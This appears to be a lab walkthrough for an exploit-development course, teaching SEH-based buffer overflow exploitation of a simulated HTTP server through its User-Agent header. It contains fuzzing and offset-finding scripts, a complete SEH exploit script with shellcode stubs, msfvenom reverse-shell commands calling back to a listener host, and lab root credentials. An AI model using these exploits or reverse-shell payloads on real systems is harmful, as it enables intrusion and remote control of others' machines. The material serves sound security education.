# OSED Lab 2: Basic SEH - Detailed Exploitation Guide

## 🎯 Objectives

By completing this lab, you will:
- Understand Windows Structured Exception Handler (SEH) mechanism
- Learn to identify and exploit SEH-based buffer overflows
- Master the POP POP RET exploitation technique
- Practice HTTP-based vulnerability exploitation
- Develop skills in exception handler manipulation

## 🔍 Lab Information

- **Difficulty**: Beginner (requires Lab 1 completion)
- **Target OS**: Simulated Windows 7 SP1 (32-bit)
- **Vulnerability**: SEH buffer overflow in HTTP User-Agent processing
- **Service**: HTTP server on port 8080
- **Buffer Size**: 512 bytes (SEH overwrite at ~600+ bytes)
- **Protections**: NONE (ASLR, DEP, Stack Canaries disabled, SEH enabled but vulnerable)

## 🚀 Getting Started

### 1. Start the Lab

```bash
# Navigate to lab directory
cd labs/osed/beginner/lab02-basic-seh

# Start the lab environment
docker-compose up -d

# Check if containers are running
docker-compose ps
```

### 2. Target Information

- **Target IP**: `10.13.37.10`
- **HTTP Service**: Port 8080
- **SSH Access**: Port 22 (root:osed456!)
- **Vulnerability**: User-Agent header buffer overflow

## 📚 SEH Theory & Background

### Understanding SEH

**Structured Exception Handler (SEH)** is a Windows feature that allows programs to handle runtime exceptions (crashes, access violations, etc.) gracefully. Instead of immediately terminating, the program can catch exceptions and attempt recovery.

### SEH Chain Structure

SEH works through a **chain of exception handlers** stored on the stack:

```
┌─────────────────────────────────┐
│        Stack Frame              │
├─────────────────────────────────┤
│    Local Variables & Buffers    │
├─────────────────────────────────┤
│        SEH Record               │
│  ┌─────────────────────────────┐│
│  │ Next SEH Pointer (4 bytes)  ││ ← Points to next SEH record
│  │ Handler Address (4 bytes)   ││ ← Exception handler function
│  └─────────────────────────────┘│
├─────────────────────────────────┤
│     Previous Stack Frame        │
└─────────────────────────────────┘
```

### SEH Exploitation Mechanism

1. **Buffer Overflow**: Overflow local buffer to reach SEH record
2. **SEH Overwrite**: Control the Handler Address field
3. **Exception Trigger**: Cause an exception (access violation, divide by zero, etc.)
4. **Handler Execution**: Windows calls our controlled handler address
5. **Code Execution**: Handler executes our shellcode or ROP chain

### POP POP RET Technique

In SEH exploitation, we typically use a **POP POP RET** instruction sequence:

```assembly
POP reg32    ; Pop first value from stack
POP reg32    ; Pop second value from stack  
RET          ; Return to address on stack (our shellcode)
```

This technique helps us navigate the SEH calling convention and execute our payload.

## 🔨 Exploitation Walkthrough

### Phase 1: Reconnaissance & Service Analysis

1. **Connect to the HTTP service**:
```bash
# Test basic connectivity
curl -v http://10.13.37.10:8080/

# Check service headers
curl -I http://10.13.37.10:8080/
```

2. **Explore available endpoints**:
```bash
# Main page
curl http://10.13.37.10:8080/

# Status endpoint
curl http://10.13.37.10:8080/status

# Vulnerable endpoint
curl http://10.13.37.10:8080/vulnerable
```

3. **Analyze User-Agent processing**:
```python
#!/usr/bin/env python3
import requests

target_url = "http://10.13.37.10:8080/"

# Test normal User-Agent
headers = {"User-Agent": "Mozilla/5.0 (Test Browser)"}
response = requests.get(target_url, headers=headers)
print(f"Normal User-Agent Response: {response.status_code}")

# Test longer User-Agent
headers = {"User-Agent": "A" * 100}
response = requests.get(target_url, headers=headers)
print(f"Long User-Agent Response: {response.status_code}")
```

### Phase 2: Vulnerability Discovery & Analysis

1. **Test for buffer overflow**:
```python
#!/usr/bin/env python3
import requests
import time

def test_overflow(payload_size):
    target_url = "http://10.13.37.10:8080/status"
    headers = {"User-Agent": "A" * payload_size}
    
    try:
        response = requests.get(target_url, headers=headers, timeout=5)
        print(f"Payload size {payload_size}: {response.status_code} - {response.reason}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"Payload size {payload_size}: Connection error - {e}")
        return False

# Test increasing payload sizes
test_sizes = [100, 300, 500, 600, 700, 800, 1000]
for size in test_sizes:
    test_overflow(size)
    time.sleep(1)  # Brief pause between tests
```

2. **Analyze the vulnerable code** (via SSH debugging):
```bash
# SSH to target for analysis
ssh root@10.13.37.10  # Password: osed456!

# Find the server process
ps aux | grep vulnerable-seh-server

# Attach debugger (optional)
gdb -p $(pidof vulnerable-seh-server)
```

### Phase 3: SEH Offset Discovery

1. **Generate unique pattern for offset finding**:
```bash
# Using Metasploit pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# Or using Python
python3 -c "
import string
chars = string.ascii_letters + string.digits
pattern = ''
for i in range(1000):
    pattern += chars[i % len(chars)]
print(pattern)
"
```

2. **Send pattern to find SEH offset**:
```python
#!/usr/bin/env python3
import requests

# Generated unique pattern (first 1000 characters)
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9"

target_url = "http://10.13.37.10:8080/vulnerable"
headers = {"User-Agent": pattern}

try:
    response = requests.get(target_url, headers=headers, timeout=10)
    print("Pattern sent successfully")
    print(f"Response: {response.status_code}")
except Exception as e:
    print(f"Pattern test result: {e}")

print("Check server logs or debugger for SEH overwrite values")
print("Expected SEH offset: around 520-530 bytes")
```

### Phase 4: SEH Control Verification

1. **Test SEH record control** (assuming offset found at 520):
```python
#!/usr/bin/env python3
import requests
import struct

# SEH offset discovered through pattern analysis
seh_offset = 520  # Adjust based on your findings

# Build SEH control payload
payload = (
    b"A" * seh_offset +           # Fill buffer to SEH record
    b"BBBB" +                     # Next SEH pointer (overwritten)
    b"CCCC" +                     # SEH handler address (controlled)
    b"D" * 100                    # Additional overflow data
)

target_url = "http://10.13.37.10:8080/vulnerable"
headers = {"User-Agent": payload.decode('latin1')}

try:
    response = requests.get(target_url, headers=headers, timeout=10)
    print("SEH control payload sent")
    print("Check if SEH handler contains 0x43434343 (CCCC)")
except Exception as e:
    print(f"SEH control test: {e}")
```

### Phase 5: Finding POP POP RET Gadgets

In a real Windows environment, you would use tools like:
- `!mona seh` in Immunity Debugger
- `rp++` or `ROPgadget` for ROP chain analysis
- Manual disassembly to find instruction sequences

For this lab simulation, we'll use example addresses:

```python
# Example POP POP RET addresses (would be found through analysis)
pop_pop_ret_gadgets = [
    0x625011af,  # Example from system DLL
    0x625011bb,  # Alternative gadget
    0x77dc15a3,  # Another system gadget
]

# In real exploitation, verify these with:
# !mona seh -cp nonull
# or manual analysis of loaded modules
```

### Phase 6: Complete SEH Exploit Development

1. **Generate shellcode**:
```bash
# Generate reverse shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.37.1 LPORT=4444 -f python -v shellcode -b "\x00\x0a\x0d\x20"

# Or bind shell payload
msfvenom -p windows/shell_bind_tcp LPORT=4445 -f python -v shellcode -b "\x00\x0a\x0d\x20"

# Simple calc.exe for testing
msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b "\x00\x0a\x0d\x20"
```

2. **Build complete SEH exploit**:
```python
#!/usr/bin/env python3
import requests
import struct
import time

# Configuration
TARGET_URL = "http://10.13.37.10:8080/vulnerable"
SEH_OFFSET = 520  # Adjust based on your analysis
POP_POP_RET = 0x625011af  # Example address - find real one

# Shellcode (generated with msfvenom)
shellcode = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    # ... (your generated shellcode here)
    # Truncated for space - use actual msfvenom output
)

def build_seh_payload():
    """Build the complete SEH exploit payload"""
    
    # NOP sled for reliability
    nop_sled = b"\x90" * 16
    
    # Build the payload
    payload = (
        b"A" * SEH_OFFSET +                    # Fill buffer to SEH record
        b"AAAA" +                              # Next SEH pointer (can be anything)
        struct.pack("<L", POP_POP_RET) +       # SEH handler: POP POP RET address
        nop_sled +                             # NOP sled
        shellcode                              # Our shellcode
    )
    
    return payload

def send_seh_exploit():
    """Send the SEH exploit to the target"""
    payload = build_seh_payload()
    
    print(f"[*] SEH Exploit Payload:")
    print(f"    Buffer fill: {SEH_OFFSET} bytes")
    print(f"    POP POP RET: 0x{POP_POP_RET:08x}")
    print(f"    Shellcode size: {len(shellcode)} bytes")
    print(f"    Total payload: {len(payload)} bytes")
    
    headers = {"User-Agent": payload.decode('latin1', errors='replace')}
    
    try:
        print("[*] Sending SEH exploit...")
        response = requests.get(TARGET_URL, headers=headers, timeout=10)
        print(f"[+] Exploit sent! Response: {response.status_code}")
        
        # In real exploitation, shellcode would execute here
        print("[!] Check target for shellcode execution")
        
    except requests.exceptions.RequestException as e:
        print(f"[*] Exploit sent - Connection behavior: {e}")
        print("[!] This may indicate successful exploitation")

def main():
    print("OSED Lab 2: SEH Exploit")
    print("=" * 40)
    
    # Set up listener if using reverse shell
    print("[!] If using reverse shell, set up listener:")
    print("    nc -nvlp 4444")
    input("[?] Press Enter when ready to exploit...")
    
    # Send the exploit
    send_seh_exploit()

if __name__ == "__main__":
    main()
```

### Phase 7: Advanced SEH Exploitation Techniques

1. **Short jumps in SEH**:
```python
# Sometimes we need a short jump to reach our shellcode
# \xeb\x06\x90\x90 = JMP +6, NOP, NOP
short_jump = b"\xeb\x06\x90\x90"

payload = (
    b"A" * seh_offset +
    short_jump +                               # Short jump over handler
    struct.pack("<L", pop_pop_ret_addr) +      # POP POP RET
    b"\x90" * 16 +                            # NOP sled
    shellcode
)
```

2. **Exception handling verification**:
```python
# Verify our SEH exploit triggers proper exception handling
def trigger_seh_exception():
    """Force an exception to test SEH mechanism"""
    
    # Large payload to ensure SEH overwrite
    payload = b"A" * 1000
    
    headers = {"User-Agent": payload.decode('latin1')}
    
    try:
        response = requests.get(TARGET_URL, headers=headers)
        print("No exception triggered - need larger payload")
    except:
        print("Exception likely triggered - SEH mechanism activated")
```

## 🏃‍♂️ Quick Exploitation Steps

For experienced users, here's the condensed SEH exploitation process:

1. **Find SEH offset**: Generate pattern, send to target, find SEH overwrite offset
2. **Locate POP POP RET**: Find instruction sequence in loaded modules
3. **Build payload**: `buffer_fill + next_seh + pop_pop_ret + nops + shellcode`
4. **Generate shellcode**: `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444`
5. **Exploit**: Send HTTP request with User-Agent containing SEH payload
6. **Trigger exception**: Overflow causes exception, SEH handler executes our code

## 🎯 Success Criteria

You have successfully completed this lab when you:

1. **Understand SEH mechanism**: Explain how Windows SEH works and chain structure
2. **Identify vulnerability**: Locate SEH overflow in User-Agent processing
3. **Control SEH handler**: Demonstrate control over exception handler address
4. **Execute payload**: Achieve code execution through SEH exploitation
5. **Capture flags**:
   - User flag: `/home/student/local.txt`
   - Root flag: `/root/proof.txt`

## 🛠 Troubleshooting Guide

### Common Issues:

#### HTTP Connection Problems
```bash
# Check container status
docker-compose ps

# Test basic connectivity
curl -v http://10.13.37.10:8080/

# Check service logs
docker-compose logs target
```

#### SEH Offset Incorrect
- Verify pattern generation accuracy
- Check for encoding issues in HTTP headers
- Use debugger to trace stack layout
- Account for User-Agent header parsing

#### POP POP RET Not Found
- In real Windows environment: use `!mona seh`
- Manually search loaded modules for instruction sequences
- Verify addresses are not affected by ASLR (disabled in lab)

#### Shellcode Not Executing
- Check for bad characters in HTTP context
- Verify shellcode encoding for User-Agent header
- Ensure proper NOP sled placement
- Test with simpler payloads (calc.exe)

### Debugging Commands:

```bash
# SSH to target for detailed analysis
ssh root@10.13.37.10  # Password: osed456!

# Monitor server process
ps aux | grep vulnerable-seh-server

# Check system logs
tail -f /var/log/lab/seh-server.log

# Network analysis
netstat -tlnp | grep 8080

# GDB debugging
gdb -p $(pidof vulnerable-seh-server)
(gdb) set disassembly-flavor intel
(gdb) continue
```

## 📚 Learning Resources

### SEH-Specific Documentation
- **Corelan Team**: [SEH Based Exploits Tutorial](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)
- **Microsoft Docs**: [Structured Exception Handling](https://docs.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp)
- **Intel Manual**: Volume 3A - Exception and Interrupt Handling

### Tools and References
- **Immunity Debugger**: SEH chain analysis with `!mona seh`
- **WinDbg**: Advanced Windows debugging and SEH inspection
- **Metasploit Framework**: Pattern generation and shellcode tools
- **ROPgadget**: Finding ROP chains and instruction sequences

## 🔄 Next Steps

After completing this lab:

1. **Lab 3**: "Stack Cookies" - Bypassing stack canary protection
2. **Real Windows SEH**: Practice on actual Windows VMs
3. **Advanced SEH**: SafeSEH and SEHOP bypass techniques
4. **ROP Chains**: Return-oriented programming for modern mitigations

## 💡 Tips for Success

1. **Understand the theory**: SEH is complex - ensure you understand the mechanism
2. **Practice debugging**: Use GDB/debuggers to visualize stack layout
3. **Test incrementally**: Build exploit step by step, verifying each component
4. **Handle encoding**: HTTP headers have specific encoding requirements
5. **Document findings**: Keep detailed notes of offsets and addresses

---

**Happy SEH Exploit Development!** 🎯

Remember: This lab simulates Windows SEH on Linux for educational purposes. Real-world SEH exploitation requires actual Windows environments and additional complexity involving module analysis, bad character identification, and modern protection bypasses.